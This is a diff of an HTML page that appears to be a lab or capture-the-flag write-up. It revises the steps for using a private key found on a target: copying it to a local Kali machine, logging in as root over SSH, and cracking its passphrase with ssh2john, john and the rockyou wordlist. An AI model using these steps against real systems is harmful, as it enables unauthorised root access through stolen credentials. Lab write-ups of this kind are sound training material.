@@ -94,10 +94,11 @@ do all kinds of things with this.</p>
     <p>During enumeration I found a file name id_rsa.tar.gz in /var/www. I was able to unzip this file and read the contents of the id_rsa.tar file which turned out to be a private key file.</p>
     <h2>SSH private key hacking</h2>
     <p><ol>
-        <ul>copy the contents and paste it in a new file named priv_key.txt using nano</ul>
+        <ul>copy the contents of the file in the remote shell</ul>
+        <ul>start a new console on the local Kali system, start nano and paste the copied content in a new file named priv_key.txt</ul>
         <ul>chmod 600 priv_key.txt</ul>
         <ul>ssh -i priv_key.txt root@10.10.1.213</ul>
-        <ul>A passphrase is needed</ul>
+        <ul>Alert: "A passphrase is needed"</ul>
         <ul>python /usr/share/john/ssh2john priv_key.txt > hash.txt</ul>
         <ul>john hash.txt</ul>
         <ul>If standard john wordlist doesn't work, try this  --wordlist=/usr/share/wordlists/rockyou.txt</ul>
